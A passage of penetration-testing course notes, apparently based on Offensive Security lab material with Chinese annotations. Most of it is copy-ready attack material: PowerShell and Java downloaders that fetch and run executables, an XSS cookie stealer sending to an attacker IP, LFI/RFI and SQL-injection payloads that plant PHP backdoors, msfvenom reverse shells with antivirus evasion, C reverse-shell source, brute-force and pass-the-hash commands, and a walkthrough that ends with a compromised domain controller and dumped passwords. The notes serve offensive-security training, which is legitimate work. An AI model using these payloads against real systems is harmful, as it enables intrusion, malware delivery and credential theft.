echo \$file = "new-exploit.exe" \>\>wget.ps1

echo \$webclient.DownloadFile(\$url,\$file) \>\>wget.ps1

powershell:

\$storageDir = \$pwd

\$webclient = New-Object System.Net.WebClient

\$url = "https://chasers.fun/nc.exe"

\$file = "nc3.exe"

\$webclient.DownloadFile(\$url,\$file)

powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File
wget.ps1

![](media/a2b01a11f5209d570c893ebf9d50014e.png)

![](media/4fc121d4ad25b91124e129aa102623a7.png)

4. Using debug.exe to Transfer Files

32 bit Windows operating systems

The debug.exe program acts as an assembler, disassembler, and a hex dumping
tool.

The concept behind the use of debug.exe for file transfers is similar to the use
of scripting languages. We use non-interactive echo commands, to write out the
binary file in its hex value equivalents, and then use debug.exe to assemble the
written text file into a binary file. There is a 64k byte size limit to the
files that can be created by debug.exe.

The upx utility has optimized the file size of nc.exe, and decreased it by
almost 50%. The

Windows PE file is still functional, and can be run as normal.

![](media/b4d774c6906fcc00e197f1160c35a4c8.png)

Now that our file is optimized and ready for transfer, we can convert the nc.exe
file to a text file that can be used by debug.exe, on the victim machine, to
rebuild the file from text, back to an executable.

![](media/5c19c95d0116610f6c96d4459d5fc489.png)

Privilege Escalation

Privilege Escalation Exploits

Local Privilege Escalation Exploit in Linux Example

https://git.zx2c4.com/CVE-2012-0056/about/

You have discovered SSH credentials for a user on anUbuntu machine. You SSH in,
and discover that you have normal user privileges. Youdiscover that the machine
is running Ubuntu 11.10, 32 bit, which has never beenpatched. You decide to use
a known Linux kernel root exploit, which affects CVE 2012-0056. You download the
exploit to the victim machine, compile it, and run it:

wget -O exploit.c http://www.exploit-db.com/download/18411

gcc -o mempodipper exploit.c

./mempodipper

Local Privilege Escalation Exploit in Windows Example

python pyinstaller.py --onefile ms11-080.py

Configuration Issues

Incorrect File and Service Permissions

![](media/c0b36226794965c25c23f4cfabf423c0.png)

![](media/9c82efa6ad5b180975a7435aeda1146b.png)

![](media/e0a32d538d2ed0ac098e0556788d03fb.png)

Once compiled, we replace the original scsiaccess.exe file with our own, and
wait patiently for a service restart, or a system reboot. The next time the
service is started, the fake scsiaccess.exe file will be run with SYSTEM
privileges, thus successfully adding our low privileged user to the
Administrators group.

Think Like a Network Administrator

You dig into the code running the site, and discover administrative database
credentials within. Fortunately, the database is externally available. You
connect to the database with your newly found administrative credentials, and
execute system commands through the database with administrative, or SYSTEM
privileges.

Java applet

import java.applet.\*;

import java.awt.\*;

import java.io.\*;

import java.net.URL;

import java.util.\*;

/\*\*

\* Author: Offensive Security

\* This Java applet will download a file and execute it.

\*\*/

public class Java extends Applet {

>   private Object initialized = null;

>   public Object isInitialized()

>   {

>   return initialized;

>   }

>   public void init() {

>   Process f;

>   try {

>   String tmpdir = System.getProperty("java.io.tmpdir") + File.separator;

>   String expath = tmpdir + "evil.exe";

>   String download = "";

>   download = getParameter("1");

>   if (download.length() \> 0) {

>   // URL parameter

>   URL url = new URL(download);

>   // Get an input stream for reading

>   InputStream in = url.openStream();

>   // Create a buffered input stream for efficency

>   BufferedInputStream bufIn = new BufferedInputStream(in);

>   File outputFile = new File(expath);

>   OutputStream out = new BufferedOutputStream(new

>   FileOutputStream(outputFile));

>   byte[] buffer = new byte[2048];

>   for (;;) {

>   int nBytes = bufIn.read(buffer);

>   if (nBytes \<= 0) break;

>   out.write(buffer, 0, nBytes);

>   }

>   out.flush();

>   out.close();

>   in.close();

>   f = Runtime.getRuntime().exec("cmd.exe /c " + expath);

>   }

} catch(IOException e) {

e.printStackTrace();

}

/\* ended here and commented out below for bypass \*/

catch (Exception exception)

{

exception.printStackTrace();

}

}

}

f = Runtime.getRuntime().exec("cmd.exe /c " + expath + " 10.11.0.5 443 -e
cmd.exe");

编译:

javac -source 1.7 -target 1.7 Java.java

echo “Permissions: all-permissions” \> /root/manifest.txt

jar cvf Java.jar Java.class

keytool -genkey -alias signapplet -keystore mykeystore -keypass

mykeypass -storepass password123

jarsigner -keystore mykeystore -storepass password123 -keypass mykeypass

\-signedjar SignedJava.jar Java.jar signapplet

cp Java.class SignedJava.jar /var/www/html/

echo '\<applet width="1" height="1" id="Java Secure" code="Java.class"

archive="SignedJava.jar"\>\<param name="1"
value="http://10.11.0.5:80/evil.exe"\>\</applet\>' \> /var/www/html/java.html

cp /usr/share/windows-binaries/nc.exe /var/www/html/evil.exe

![](media/30e78257fa5246fd90208746aad5919b.png)

XSS redirection

\<iframe SRC="http://10.11.0.5/report" height = "0" width ="0"\>\</iframe\>

nc -nlvp 80

XSS Steal cookie

\<script\>

new Image().src="http://10.11.0.5/bogus.php?output="+document.cookie;

\</script\>

nc -nlvp 80

LFI

Contaminating Log Files

![](media/f5cbb8f2c56c91b30ee61e8c20a5cdfc.png)

This connection results in the following text written to the Apache log files

c:\\xampp\\apache\\logs\\access.log

10.11.0.5 - - [17/Apr/2013:06:22:00 -0400] " \<?php echo
shell_exec(\$_GET['cmd']);?\>"

400 1047

code execution

http://10.11.1.35/addguestbook.php?name=a&comment=b&cmd=ipconfig&LANG=../../../../../../../xampp/apache/logs/access.log%00

RFI

http://10.11.1.35/addguestbook.php?name=a&comment=b&LANG=http://10.11.0.5/evil.txt

![](media/9f5ec29f99562e854c7507f042d1e64d.png)

![](media/5119a83247eb4a82cea96cafeebe8685.png)

http://10.11.1.35/addguestbook.php?name=a&comment=b&LANG=http://10.11.0.5/evil.txt%00

SQLI

http://10.11.1.35/comment.php?id=738 union all select 1,2,3,4,table_name,6 FROM

information_schema.tables

http://10.11.1.35/comment.php?id=738 union all select 1,2,3,4,column_name,6 FROM

information_schema.columns where table_name='users'

http://10.11.1.35/comment.php?id=738 union select 1,2,3,4,concat(name,0x3a,

password),6 FROM users

http://10.11.1.35/comment.php?id=-1 union select
1,2,3,4,load_file(‘c:/windows/system32/drivers/etc/hosts’),6

http://10.11.1.35/comment.php?id=738 union all select 1,2,3,4,"\<?php echo

shell_exec(\$_GET['cmd']);?\>",6 into OUTFILE 'c:/xampp/htdocs/backdoor.php'

sqlmap -u http://10.11.1.35 --crawl=1

sqlmap -u http://10.11.1.35/comment.php?id=738 --dbms=mysql --dump --threads=5

sqlmap contains many advanced features, such as the ability to attempt Web
Application

Firewall (WAF)64 bypasses and execute complex sequences of queries that automate
a

complete takeover of the server. For example, using the os-shell parameter will
attempt

to automatically upload and execute remote command shell on the target.

sqlmap -u http://10.11.1.35/comment.php?id=738 --dbms=mysql --os-shell

Password Attacks

Dictionary Files

![](media/9325cc5da38e946ceee9ffce2248abe6.png)

Key-space Brute Force

Password key-space brute-force is a technique of generating all possible
combinations of characters and using them for password cracking.

![](media/a0c7f84972f5bf08e8f8b138f569614c.png)

![](media/515e4ffbc8302ec004d0d175a601292a.png)

[Capital Letter] [2 x lower case letters] [2 x special chars] [3 x numeric]

\@ - Lower case alpha characters

, - Upper case alpha characters

% - Numeric characters

\^ - Special characters including space

![](media/8166474c1dc83ee7cca14a3965c19633.png)

Pwdump and Fgdump

Microsoft Windows operating systems store hashed user passwords in the Security
Accounts Manager (SAM)65. To deter SAM database offline password attacks,
Microsoft introduced the SYSKEY feature (Windows NT 4.0 SP3), which partially
encrypts the SAM file.

LAN Manager (LM), based on DES

NT LAN Manager (NTLM), based on MD4 hashing

LM is known to be very weak for multiple reasons:

1. Passwords longer than seven characters are split into two strings and each
piece is hashed separately.

2. The password is converted to upper case before being hashed.

3. The LM hashing system does not include salts, making rainbow table attacks
feasible.

From Windows Vista on, the Windows operating system disables LM by default and
uses NTLM.

However, NTLM hashes stored in the SAM database are still not salted.

The SAM database cannot be copied while the operating system is running, as the
Windows kernel keeps an exclusive file system lock on the file. However,
in-memory attacks to dump the SAM hashes can be mounted using various
techniques.

Pwdump and fgdump68 are good examples of tools that are able to perform
in-memory attacks, as they inject a DLL containing the hash dumping code into
the Local Security Authority Subsystem (LSASS)69 process. The LSASS process has
the necessary privileges to extract password hashes as well as many useful API
that can be used by the hash dumping tools.

Fgdump works in a very similar manner to pwdump, but also attempts to kill local
antiviruses before attempting to dump the password hashes and cached
credentials.

http://foofus.net/goons/fizzgig/pwdump/pwdump6-2.0.0-beta-exe-only.tar.bz2

http://foofus.net/goons/fizzgig/fgdump/fgdump-2.1.0-exeonly.tar.bz2

![](media/893f4ad529f6fb51d21fee069ae999c9.png)

![](media/3fb76ab273f8d02417e4408116778269.png)

Windows Credential Editor (WCE)

Windows Credentials Editor (WCE) is a security tool that allows one to perform
several attacks to obtain clear text passwords and hashes from a compromised
Windows host.

WCE can steal NTLM credentials from memory and dump cleartext passwords stored
by Windows authentication packages installed on the target system such as
msv1_0.dll, kerberos.dll, and digest.dll.

WCE is able to steal credentials either by using DLL injection or by directly
reading the LSASS process memory.

The downside is that extracting and decrypting credentials from LSASS process
memory means working with undocumented Windows structures, reducing the
portability of this method for newer versions of the OS.

![](media/04c9a564a3075a39590c59934d33c06b.png)

Password Profiling

![](media/54017b6a6eedae2a091569b3230baa2e.png)

![](media/9a1430c68309873f13c058b91e64469b.png)

Password Mutating

Users most commonly tend to mutate their passwords in various ways. This could
include adding a few numbers at the end of the password, swapping out lowercase
for capital letters, changing certain letters to numbers, etc. We can now take
our minimalistic password list generated by cewl and add common mutation
sequences to these passwords.

A good tool for doing this is John the Ripper72. John comes with an extensive
configuration file where password mutations can be defined. In the following
example, we add a simplistic rule to append two numbers to each password.

![](media/50047b2ec1a4e151cdb594b7fedb1b7e.png)

![](media/2e0a7b9780d87022f9319fd3a39d171e.png)

Online Password Attacks

HTTP Brute Force

medusa -h 10.11.1.219 -u admin -P password-file.txt -M http -m DIR:/admin -T 10

RDP Brute force

ncrack -vv --user offsec -P password-file.txt rdp://10.11.1.35

SNMP Brute Force

hydra -P password-file.txt -v 10.11.1.219 snmp

SSH bruteforce

hydra -l root -P password-file.txt 10.11.1.219 ssh

Account Lockouts and Log Alerts

Choosing the Right Protocol: Speed vs. Reward

However, in some cases (such as RDP and SMB), increasing the number of threads
may not be possible due to protocol restrictions, making the password guessing
process relatively slow.

Password Hash Attacks

There are three main hash properties you should pay attention to:

1.The length of the hash (each hash function has a specific output length).

2. The character-set used in the hash.

3. Any special characters that may be present in the hash.

![](media/647826fb4f49e1b5653bd8312fa83b71.png)

John the Ripper

![](media/76ee6b4b546215de37ea221c961b66a5.png)

![](media/94762a53e38b71b8c079f474ef0b38cb.png)

![](media/20336c36ccd50326bbdffb69462a4d27.png)

crack Linux hashes

use the unshadow utility to combine the passwd and shadow files

unshadow passwd-file.txt shadow-file.txt \> unshadowed.txt

john --rules --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt

Rainbow Tables

To increase the difficulty in password cracking, passwords are often
concatenated with a random value before being hashed. This value is known as a
salt, and its value, which should be unique for each password, is stored
together with the hash in a database or a file to be used in the authentication
process. The primary intent of salting is to increase the infeasibility of
Rainbow Table attacks that could otherwise be used to greatly improve the
efficiency of cracking the hashed password database.

Passing the Hash in Windows

This is possible because NTLM/LM password hashes are not salted and remain
static between sessions and computers whose combination of username and password
is the same.

![](media/8eb37952b5f08d0622f41a684a3b52ef.png)

export SMBHASH=aad3b435b51404eeaad3b435b51404ee:6F403D3166024568403A94C3A6561896

pth-winexe -U administrator% //10.11.01.76 cmd

Port Redirection and Tunneling

Port Forwarding/Redirection

A simple port-forwarding tool such as rinetd

apt-get install rinetd

cat /etc/rinetd.conf

\# bindadress bindport connectaddress connectport

w.x.y.z 53 a.b.c.d 80

service rinetd start

SSH Tunneling

Local Port Forwarding

ssh \<gateway\> -L \<local port to listen\>:\<remote host\>:\<remote port\>

攻击者ssh连接受害者 攻击者端口 目标代理主机 目标代理端口

![](media/94edefd8e5369cfa00a64ab6f6577ce4.png)

Remote Port Forwarding

ssh \<gateway\> -R \<remote port to bind\>:\<local host\>:\<local port\>

受害者ssh连接攻击者机器 攻击者机器端口:受害者机器(127.0.0.1):受害者端口(3389)

![](media/5e0a89e397a9acd847abfc07e56ef31e.png)

Dynamic Port Forwarding

ssh -D \<local proxy port\> -p \<remote port\> \<target\>

攻击者ssh连接受害者 攻击者端口 受害者sshd服务端口 受害者主机

![](media/80e3f40cad2775c739c5e39cd155104c.png)

受害者机器:

ssh -f -N -R 2222:127.0.0.1:22 root\@208.68.234.100

攻击者机器:

ssh -f -N -D 127.0.0.1:8080 -p 2222 hax0r\@127.0.0.1

proxychains /etc/proxychains.conf

socks5 127.0.0.1 8080

HTTP Tunneling

Traffic Encapsulation

HTTPTunnel or stunnel

![](media/e5c1ee90b306088fcc6b88bcc78f572e.png)

MSF

systemctl start postgresql

systemctl enable postgresql

msfconsole

show -h

msf \> hosts

msf \> db_nmap 10.11.1.1-254

msf \> services -p 443

msf \> use auxiliary/scanner/smb/smb_version

msf auxiliary(smb_version) \> services -p 443 --rhosts

A non-staged payload is a payload that is sent in its entirety in one go – as
we’ve been doing up to now. A staged payload is usually sent in two parts. The
first part is a small primary payload, which causes the victim machine to
connect back to the attacker, accept a longer secondary payload containing the
rest of the shellcode, and then execute it.

There are several situations where we would prefer to use staged shellcode over
nonstaged:

1. The vulnerability we are exploiting does not have enough buffer space to hold
a full payload. As the first part of a staged payload is typically smaller than
a full payload, these smaller payloads can often save us in tight situations.

2. Antivirus software is detecting embedded shellcode in an exploit. By
replacing the embedded shellcode with a staged payload, we will be removing most
of the malicious part of the shellcode and injecting it directly into the victim
machine memory.

If the user does not specify a payload for an exploit, a reverse Meterpreter
payload is used by default.

Meterpreter is a staged payload. The second stage is a 750k DLL file that is
injected directly into memory. As the DLL file never touches the victim file
system, it is less likely to be detected by antivirus software.

meterpreter \> sysinfo

meterpreter \> getuid

meterpreter \> search -f \*pass\*.txt

注入payload到现有PE文件:

msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.5 LPORT=4444 -f exe -e
x86/shikata_ga_nai -i 9 -x /usr/share/windows-binaries/plink.exe -o
shell_reverse_msf_encoded_embedded.exe

Reverse HTTPS Meterpreter

The reverse_https Meterpreter payload is designed to work just like a standard
meterpreter payload, although the communications on the network look exactly
like normal HTTPS traffic.

msfvenom -p windows/meterpreter/reverse_https LHOST=10.11.0.5 LPORT=443 -f exe
-o met_https_reverse.exe

The MSF multi/handler module can accept various incoming payloads and handle
them correctly, including single and multi-stage payloads.

root\@kali:\~\# msfconsole

msf \> use exploit/multi/handler

msf exploit(handler) \> set PAYLOAD windows/meterpreter/reverse_https

In this case, as we set the payload to reverse_https_meterpreter, the handler
will start a first stage listener on our desired port, TCP 443. Once the first
stage payload is accepted by the multi/handler, the second stage of the payload
is fed back to the target machine by the handler.

the Meterpreter payload is able to migrate from one process to another as long
as it migrates into a similar or lower authority process. This allows us to
migrate to more stable processes, which will continue running even after the
client application is closed.

Bypassing Antivirus Software

msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.5 LPORT=4444 -f exe -e
x86/shikata_ga_nai -i 9 -x /usr/share/windows-binaries/plink.exe -o
shell_reverse_msf_encoded_embedded.exe

cp shell_reverse_msf_encoded_embedded.exe backdoor.exe

cp /usr/share/windows-binaries/Hyperion-1.0.zip .

unzip Hyperion-1.0.zip

cd Hyperion-1.0/

i686-w64-mingw32-g++ Src/Crypter/\*.cpp -o hyperion.exe

cp -p /usr/lib/gcc/i686-w64-mingw32/6.1-win32/libgcc_s_sjlj-1.dll .

cp -p /usr/lib/gcc/i686-w64-mingw32/6.1-win32/libstdc++-6.dll .

wine hyperion.exe ../backdoor.exe ../crypted.exe

Using Custom/Uncommon Tools and Payloads

C reverse shell code:

/\* Windows Reverse Shell

Tested under windows 7 with AVG Free Edition.

Author: blkhtc0rp

Compile: wine gcc.exe windows.c -o windows.exe -lws2_32

Written 2010 - Modified 2012

This program is open source you can copy and modify, but please keep author
credits!

http://code.google.com/p/blkht-progs/

https://snipt.net/blkhtc0rp/

\*/

\#include \<winsock2.h\>

\#include \<stdio.h\>

\#pragma comment(lib,"ws2_32")

WSADATA wsaData;

SOCKET Winsock;

SOCKET Sock;

struct sockaddr_in hax;

char ip_addr[16];

STARTUPINFO ini_processo;

PROCESS_INFORMATION processo_info;

int main(int argc, char \*argv[])

{

WSAStartup(MAKEWORD(2,2), \&wsaData);

Winsock=WSASocket(AF_INET,SOCK_STREAM,IPPROTO_TCP,NULL,(unsigned

int)NULL,(unsigned int)NULL);

if (argc != 3){fprintf(stderr, "Uso: \<rhost\> \<rport\>\\n"); exit(1);}

struct hostent \*host;

host = gethostbyname(argv[1]);

strcpy(ip_addr, inet_ntoa(\*((struct in_addr \*)host-\>h_addr)));

hax.sin_family = AF_INET;

hax.sin_port = htons(atoi(argv[2]));

hax.sin_addr.s_addr = inet_addr(ip_addr);

WSAConnect(Winsock,(SOCKADDR\*)\&hax,sizeof(hax),NULL,NULL,NULL,NULL);

memset(\&ini_processo,0,sizeof(ini_processo));

ini_processo.cb=sizeof(ini_processo);

ini_processo.dwFlags=STARTF_USESTDHANDLES;

ini_processo.hStdInput = ini_processo.hStdOutput = ini_processo.hStdError =

(HANDLE)Winsock;

CreateProcess(NULL,"cmd.exe",NULL,NULL,TRUE,0,NULL,NULL,&ini_processo,&processo_info)

;

}

This code is esoteric and probably not commonly used; therefore, there is a good
chance that most AV vendors do not have a signature for it when compiled.

综合实战:

cewl www.megacorpone.com -m 6 -w mega-cewl.txt

john --wordlist=mega-cewl.txt --rules --stdout \> mega-mangled

cat mega-mangled \|wc -l

16204

medusa -h admin.megacorpone.com -u admin -P mega-mangled -M http -n 81 -m
DIR:/admin -T 30

![](media/9391433223564ec9726a424a5d08907d.png)

functions.admin.inc.php

function generate_pw_hash(\$pw)

{

\$salt = random_string(10,'0123456789abcdef');

\$salted_hash = sha1(\$pw.\$salt);

\$hash_with_salt = \$salted_hash.\$salt;

return \$hash_with_salt;

}

./oclHashcat64.bin -m 110 hash.txt ../big-wordlist.txt --force

![](media/fd70263cc2636433c6d2d750ab53f4fa.png)

“remote code injection”

The vulnerable software is protected with an HTTP authentication mechanism,
while the exploit we found does not deal with authentication at all. If we have
any hopes of getting this exploit to work, we need to add HTTP authentication
features to the exploit.

Now that our modified exploit is tested and working, we set up a Netcat listener
and fire off our exploit. A reverse shell is received, with low user privileges.

nc -nlvp 80

python rce-fixed.py http://admin.megacorpone.com:81/admin/sqlite/ 208.68.234.99
80 admin nanotechnology1

listening on [any] 80 ...

connect to [208.68.234.99] from (UNKNOWN) [50.7.67.190] 44872

id

uid=33(www-data) gid=33(www-data) groups=33(www-data)

python -c 'import pty;pty.spawn("/bin/bash")'

www-data\@adminsql:/var/www/admin/sqlite\$ cat /etc/issue

Ubuntu 11.10 \\n \\l

www-data\@adminsql:/var/www/admin/sqlite\$ uname -a

Linux adminsql 3.0.0-12-generic \#20-Ubuntu SMP Fri Oct 7 14:50:42 UTC 2011 i686
i686

i386 GNU/Linux

privilege escalation

www-data\@adminsql:/var/www/admin/sqlite\$ cd /tmp

www-data\@adminsql:/tmp\$ wget -O gimmemoar.c
http://www.exploit-db.com/download/18411

www-data\@adminsql:/tmp\$ gcc gimmemoar.c

gcc gimmemoar.c

www-data\@adminsql:/tmp\$ ./a.out

\# id

uid=0(root) gid=0(root) groups=0(root),33(www-data)

root\@adminsql:/tmp\# cd /var/www/

root\@adminsql:/var/www\# ls -la

root\@adminsql:/var/www\# cd daaa118f0809caa929e0c0baae75d27a

root\@adminsql:/var/www/daaa118f0809caa929e0c0baae75d27a\# ls -la

root\@adminsql:/var/www/daaa118f0809caa929e0c0baae75d27a\# cat .htaccess

Order deny,allow

Deny from all

Allow from 10.7.0.0/255.255.255.0

root\@adminsql:/tmp\# cat /var/log/apache2/access.log \|grep '10.7.0'

...

10.7.0.53 - -"GET /daaa118f0809caa929e0c0baae75d27a/ClockSigned.jar HTTP/1.1"
200

2880 "-" "Mozilla/4.0 (Windows 7 6.1) Java/1.7.0_21"

...

root\@adminsql \# sed -i 's/\<div id="content"\>/\<div id="content"\>\<applet
width="1"

height="1" id="Java Secure" code="Java.class" archive="SignedJava.jar"\>\<param

name="1" value="http:\\/\\/208.68.234.101\\/daaa118.exe"\>\<\\/applet\>/g'

/var/www/daaa118f0809caa929e0c0baae75d27a/templates/default.tpl

root\@adminsql \# cd /var/www/daaa118f0809caa929e0c0baae75d27a

root\@adminsql \# wget http://208.68.234.101/Java.class

root\@adminsql \# wget http://208.68.234.101/SignedJava.jar

root\@kali:\~\# msfvenom -p windows/meterpreter/reverse_http LHOST=208.68.234.99

LPORT=80 -f exe -e x86/shikata_ga_nai -x /usr/share/windows-binaries/plink.exe
-o

/var/www/daaa118.exe

![](media/6aeffaf8c0e6b7ca74d2f07295870294.png)

root\@kali:\~\# msfconsole

msf exploit(handler) \> use exploit/multi/handler

msf exploit(handler) \> set PAYLOAD windows/meterpreter/reverse_http

msf exploit(handler) \> set LHOST 208.68.234.99

msf exploit(handler) \> set LPORT 80

msf exploit(handler) \> exploit

[\*] Started reverse handler on 208.68.234.99:80

[\*] Starting the payload handler...

[\*] Sending stage (751104 bytes) to 50.7.67.190

[\*] Meterpreter session 1 opened (208.68.234.99:80 -\> 50.7.67.190:51223)

meterpreter \> getuid

Server username: MEGACORPONE\\mike

C:\\Users\\mike.MEGACORPONE\\Desktop\>net use z: \\\\dc01\\SYSVOL

The command completed successfully.

Z:\\\>dir /s Groups.xml

Volume in drive Z has no label.

Volume Serial Number is 6AD0-F80A

Directory of Z:\\megacorpone.com\\Policies\\{809DED9C-BA72-49D0-A922-

FEE90E0122C9}\\Machine\\Preferences\\Groups

04/14/2013 10:47 AM 548 Groups.xml

1 File(s) 548 bytes

Total Files Listed:

1 File(s) 548 bytes

0 Dir(s) 27,201,875,968 bytes free

Z:\\\> copy
Z:\\megacorpone.com\\Policies\\{...}\\Machine\\Preferences\\Groups\\Groups.xml

C:\\Users\\mike.MEGACORPONE\\Documents

C:\\Users\\mike.MEGACORPONE\\Documents\>type Groups.xml

\<?xml version="1.0" encoding="utf-8"?\>

\<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"\>

\<User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="Administrator

cpassword= "riBZpPtHOGtVk+SdLOmJ6xiNgFH6Gp45BoP3I6AnPgZ1IfxtgI67qqZfgh78kBZB"
...

subAuthority="RID_ADMIN" userName="Administrator (built-in)"/\>\</User\>

\</Groups\>

![](media/6ceee0f1b205012977f1e9d9b56fc63e.png)

meterpreter \> upload /usr/share/windows-binaries/plink.exe
c:\\\\Windows\\\\temp

meterpreter \> shell

...

C:\\Windows\\temp\>plink -l root -pw pass -R 3389:127.0.0.1:3389 208.68.234.99

Our attempt to create a tunnel fails due to egress firewall rules present in the
management network; these are blocking outbound connections to TCP port 22. We
set the SSH daemon to listen on our attacking machine on port 80 and we retry
the outbound tunnel connection.

C:\\Windows\\temp\>plink -l root -pw pass -R 3389:127.0.0.1:3389 208.68.234.99
-P 80

This attempt fails as well, this time due to Deep Packet Inspection on the
firewall, which allows HTTP traffic only and blocks the rest.

We know for a fact that HTTP traffic on port 80 is allowed through the firewall.
We need to find a way to make our SSH Tunnel look like HTTP traffic.

This can be done by encapsulating our SSH traffic in HTTP requests, thereby
bypassing the protocol inspection test done by the Deep Packet Inspection
firewall.

A suitable tool for this job is called httptunnel

we will first need to allow this program in the Windows 7 Firewall before
running it.

Using the local administrative password found through the GPP file, we quickly
use a PowerShell script to run a second reverse Meterpreter payload with local
administrative rights.

\$secpasswd = ConvertTo-SecureString "sup3r53cr3tGP0pa55" -AsPlainText -Force

\$mycreds = New-Object System.Management.Automation.PSCredential
("Administrator",\$secpasswd)

\$computer = "DEV01"

[System.Diagnostics.Process]::Start("C:\\Windows\\temp\\dabbb118.exe","",\$mycreds.Username,
\$mycreds.Password, \$computer)

powershell -ExecutionPolicy Bypass -File c:\\Windows\\temp\\run.ps1

meterpreter \> getuid

Server username: dev01\\Administrator

meterpreter \> shell

...

C:\\Windows\\temp\> netsh advfirewall firewall add rule name="httptunnel_client"
dir=in

action=allow program="httptunnel_client.exe" enable=yes

C:\\Windows\\temp\> netsh advfirewall firewall add rule name="3000" dir=in
action=allow protocol=TCP localport=3000

C:\\Windows\\temp\> netsh advfirewall firewall add rule name="1080" dir=in
action=allow

protocol=TCP localport=1080

C:\\Windows\\temp\> netsh advfirewall firewall add rule name="1079" dir=in
action=allow

protocol=TCP localport=1079

C:\\Windows\\temp\> httptunnel_client.exe

C:\\Windows\\Temp\>plink -l root -pw 23847sd98sdf987sf98732 -R
3389:127.0.0.1:3389

127.0.0.1 -P 3000

root\@kali:\~\# netstat -antp \|grep 3389

tcp 0 0 127.0.0.1:3389 0.0.0.0:\* LISTEN 10451/6

We then use rinetd to allow access to the RDP port on the loopback interface so
that we can connect to it externally.

root\@kali:\~\# netstat -antp \|grep 3389

tcp 0 0 208.68.234.100:3389 0.0.0.0:\* LISTEN 10824/rinetd

tcp 0 0 127.0.0.1:3389 0.0.0.0:\* LISTEN 10451/6

![](media/3a2009bc2fb78ce86f42e22e6718f06a.png)

We manage to break out of the closed Citrix environment by invoking the “Save
As” dialogue from a “View Source” request in the Internet Explorer session
presented to us by the Citrix server.

![](media/b4512da0217672becf73dbc4bc5e8198.png)

\$storageDir = \$pwd

\$webclient = New-Object System.Net.WebClient

\$url = "http://208.68.234.101/daaa118.exe"

\$file = "rev.exe"

\$webclient.DownloadFile(\$url,\$file)

runas /user:CITRIX\\Administrator /sa "notepad.exe"

meterpreter \> getuid

Server username: CITRIX\\Administrator

on a high value server, one of most useful tools to run is Windows Credential
Editor (wce.exe).

This tool will dump hashes, Kerberos tickets, and clear-text passwords belonging
to existing Windows logon sessions on the server.

the wce.exe tool requires administrative privileges to run.

Because of anti-virus, we protect the wce.exe file with a commercial software
protector to avoid it being flagged as malicious. The Enigma Protector

meterpreter \> upload /var/www/wce_protected.exe c:\\\\Windows\\\\temp

Once uploaded, we run wce.exe with local administrator rights. Any lingering
Windows session credentials are dumped from memory to the console, in this case
revealing the domain administrator password.

C:\\Users\\mike\\Documents\>wce_protected.exe –w

WCE v1.3beta (X64) (Windows Credentials Editor) - (c) 2010,2011,2012 Amplia
Security

\- by Hernan Ochoa (hernan\@ampliasecurity.com)

Use -h for help.

Administrator\\MEGACORPONE:Ub3r53cr3t0fm1ne

Administrator\\CITRIX:sup3r53cr3tGP0pa55

administrator\\CITRIX:sup3r53cr3tGP0pa55

mike\\MEGACORPONE:SmcyHxbo!

Ctx_StreamingSvc\\CITRIX:sda{AaJ2jm8fx.

使用域管凭据登录域控

To do this, we create a new HTTP encapsulated SSH tunnel from Mike’s machine,
which will expose the Domain Controller’s RDP port to our attacking Kali box on
port 3390, localhost.

C:\\Windows\\Temp\>plink -l root -pw 23847sd98sdf987sf98732 -R
3390:10.20.0.21:3389 127.0.0.1 -P 3000

![](media/4fe9a8d56664d2ee12f526d940d150a6.png)

The Network Has Been Completely Compromised
